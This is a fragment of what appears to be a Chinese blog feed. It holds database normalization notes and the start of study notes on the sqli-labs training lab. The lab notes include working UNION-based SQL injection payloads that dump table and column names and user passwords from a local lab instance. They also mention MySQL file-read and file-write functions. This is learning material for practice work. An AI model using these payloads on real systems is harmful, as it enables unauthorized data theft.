style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">n</span><span class="mord mathnormal">a</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mclose">)</span></span></span></span></li></ul><h2 id="62-规范化"><a class="markdownIt-Anchor" href="#62-规范化">#</a> 6.2 规范化</h2><p>通常按属性间依赖情况来区分关系规范化程度为第一范式、第二范式、第三范式和第四范式，然后，直观地描述如何将具有不合适性质的关系转换为更合适的形式。</p><h3 id="621-函数依赖"><a class="markdownIt-Anchor" href="#621-函数依赖">#</a> 6.2.1 函数依赖</h3><p>定义<strong> 6.1</strong>：设 R (U) 是属性集 U 上的关系模式，X, Y 是 U 的子集。若对于 R (U) 的任意一个可能的关系 r，r 中不可能存在两个元组在 X 上的属性值相等，而在 Y 上的属性值不等，则称 X 函数确定 Y 或 Y 函数依赖于 X，记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>。</p><p>函数依赖和别的数据依赖一样是语义范畴的概念，只能根据语义来确定一个函数依赖。例如，姓名<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span></span></span></span> 年龄这个函数依赖只有在该部门没有同名人的条件下成立。</p><p>下面介绍一些术语和记号：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，但 Y 不属于 X，则称<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 是<strong>非平凡的函数依赖</strong>。</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，但 Y 属于 X，则称<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 是<strong>平凡的函数依赖</strong>。对于任一关系模式，平凡函数依赖都是必然成立的，他不反映新的语义。若不特别声明，总是讨论非平凡的函数依赖。</li><li>若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，则称 X 为这个函数依赖的决定属性组，也称为<strong>决定因素</strong>。</li><li>若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>→</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">Y \rightarrow X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>，则记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>←</mo><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \leftarrow \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>。</li><li>若 Y 不函数依赖于 X，则记作<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，箭头加斜线</li></ul><p>定义<strong> 6.2</strong>：在 R (U) 中，如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，并且对于 X 的任何一个真子集<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>，都有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>X</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">X&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span> 不函数依赖于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span>，则称 Y 对 X 完全函数依赖，记作 —&gt;F</p><p>定义<strong> 6.3</strong>：传递函数依赖</p><h3 id="622-码"><a class="markdownIt-Anchor" href="#622-码">#</a> 6.2.2 码</h3><p>码是关系模式中的一个重要概念。</p><p><strong>定义 6.4</strong>：设 K 为 R&lt;U,F&gt; 中的属性或属性集合，若 U 完全依赖于 K，则 K 为 R 的<strong>候选码</strong>。</p><p>注意 U 是完全依赖于 K，而不是部分依赖于 K。一般地，<strong>如果 U 函数依赖于 K，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>→</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">K \rightarrow U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span>，则 K 称为超码</strong>。候选码是一类特殊的超码，即候选码的超集（如果存在）一定是超码，候选码的任何真子集一定不是超码。</p><p>若候选码多于一个，则选定其中的一个为<strong>主码</strong>。</p><p>包含在任何一个候选码中的属性称为<strong>主属性</strong>；不包含在任何候选码中的属性称为<strong>非主属性</strong>或<strong>非码属性</strong>。最简单的情况，单个属性是码；最极端的情况，整个属性组是码，称为<strong>全码</strong>。</p><p><strong>定义 6.5</strong>：关系模式 R 中属性或属性组 X 并非 R 的码，但 X 是另一个关系模式的码，则称 X 是 R 的<strong>外部码</strong>，也称<strong>外码</strong>。</p><h3 id="623-范式"><a class="markdownIt-Anchor" href="#623-范式">#</a> 6.2.3 范式</h3><p>关系数据库中的关系是要满足一定的要求的，满足不同程度要求的为不同范式。</p><p>一个低一级范式的关系模式通过模式分解可以转换为若干个高一级范式的关系模式的集合，这种过程就叫<strong>规范化</strong>。</p><h3 id="624-2nf"><a class="markdownIt-Anchor" href="#624-2nf">#</a> 6.2.4 2NF</h3><p><strong>定义 6.6</strong>：若<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>∈</mo><mn>1</mn><mi>N</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">R\in 1NF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>，且每一个非主属性完全函数依赖于任何一个候选码，则<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>∈</mo><mn>2</mn><mi>N</mi><mi>F</mi></mrow><annotation encoding="application/x-tex">R\in 2NF</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span>。</p><h2 id="63-数据依赖的公理系统"><a class="markdownIt-Anchor" href="#63-数据依赖的公理系统">#</a> 6.3 数据依赖的公理系统</h2><p>定义<strong> 6.11</strong>：对于满足一组函数依赖 F 的关系模式 R&lt;U,F&gt;，其任何一个关系 r，若函数依赖<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span> 都成立（即 r 中任意两元祖 t、s，若 t [X]=s [X]，则 t [X]=s [Y]），则称<strong> F 逻辑蕴含<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>→</mo><mi>Y</mi></mrow><annotation encoding="application/x-tex">X \rightarrow Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></strong>.</p><p><strong>公理系统</strong>设 U 为属性集总体，F 是 U 上的一组函数依赖，于是有关系模式 R&lt;U,F&gt;，对 R&lt;U,F &gt; 来说有以下的推理规则：</p><ul><li>A1 自反律</li><li>A2 增广率</li><li>A3 传递率</li></ul><p><strong>定义 6.13</strong>：设 F 为属性集 U 上的一组函数依赖，X、Y<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>⊆</mo></mrow><annotation encoding="application/x-tex">\subseteq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719400000000001em;vertical-align:-0.13597em;"></span><span class="mrel">⊆</span></span></span></span>U，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo>+</mo></msubsup><mo>=</mo><mo stretchy="false">{</mo><mi>A</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo>→</mo><mi>A</mi><mtext>能由</mtext><mi>F</mi><mtext>根据</mtext><mi>A</mi><mi>r</mi><mi>m</mi><mi>s</mi><mi>t</mi><mi>r</mi><mi>o</mi><mi>n</mi><mi>g</mi><mtext>公理导出</mtext><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">X^+_{F}=\{A|X \rightarrow A 能由F根据Armstrong 公理导出\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal">A</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">由</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">导</span><span class="mord cjk_fallback">出</span><span class="mclose">}</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>X</mi><mi>F</mi><mo>+</mo></msubsup></mrow><annotation encoding="application/x-tex">X^+_F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.104993em;vertical-align:-0.293531em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.811462em;"><span style="top:-2.4064690000000004em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">+</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.293531em;"><span></span></span></span></span></span></span></span></span></span> 称为<strong>属性集 X 关于函数依赖集 F 的闭包</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;61-问题的提出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#61-问题的提出&quot;&gt;#&lt;/a&gt; 6.1 问题的提出&lt;/h2&gt;
&lt;p&gt;R(U,D,DOM,F)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;关系明 R 是符号化的元组语义&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    <category term="数据库" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs笔记</title>
    <link href="http://example.com/post/sqli-labs%E7%AC%94%E8%AE%B0.html"/>
    <id>http://example.com/post/sqli-labs%E7%AC%94%E8%AE%B0.html</id>
    <published>2022-06-07T06:44:48.000Z</published>
    <updated>2022-06-11T04:05:13.178Z</updated>
    
    <content type="html"><![CDATA[<p>测试上线使用</p><p>注意点：PHP 要使用低版本，高版本无法安装<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><h2 id="相关知识点"><a class="markdownIt-Anchor" href="#相关知识点">#</a> 相关知识点</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>信息收集知识点：</p><p>数据库版本：version () 5.7.22-0ubuntu0.16.04.1</p><p>数据库用户：user () root@localhost</p><p>数据库名字：database () mozhe_Discuz_StormGroup</p><p>操作系统：@@version_compile_os Linux</p><p>版本问题：5.1 以上是高版本，5 以下是低版本  （高版本和低版本的区别在于高版本有 information_schema，低版本没有）</p></blockquote><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>读写文件操作 (mysql 特有功能)</p><p>load_file (): 文件读取函数</p><p>into outfile 或 into dumpfile：导出函数</p><p>使用条件：secure_file_priv 为空（为空不是为 null），开启方法：在配置文件中添加</p></blockquote><h2 id="less-01"><a class="markdownIt-Anchor" href="#less-01">#</a> less 01</h2><ul><li>经过测试，闭合符号为单引号，注释使用 &quot;–+&quot;</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180042201.png" alt="image-20220523180042201"></p><ul><li>但是不知道为什么在通过 order 判断字段数的时候 #注释会有问题，用–+ 注释没有问题</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180210846.png" alt="image-20220523180210846"></p><ul><li>判断出字段共有三列，判断回显位置</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180255664.png" alt="image-20220523180255664"></p><ul><li>查询数据库和当前用户名</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523180338390.png" alt="image-20220523180338390"></p><ul><li>以下为 payload，依次使用即可</li></ul><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema = "security"--+ #爆破表名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),database() from information_schema.columns where table_name = "users" and table_schema = "security"--+ #爆破列名</span>http:<span class="token comment">//127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+ #爆破数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523195305411.png" alt="image-20220523195305411"></p><h2 id="less-02"><a class="markdownIt-Anchor" href="#less-02">#</a> less 02</h2><ul><li>less 02 经测试为无引号包裹</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523195251870.png" alt="image-20220523195251870"></p><ul><li>测试字段数</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220523183459282.png" alt="image-20220523183459282"></p><ul><li>信息收集</li></ul><p><img 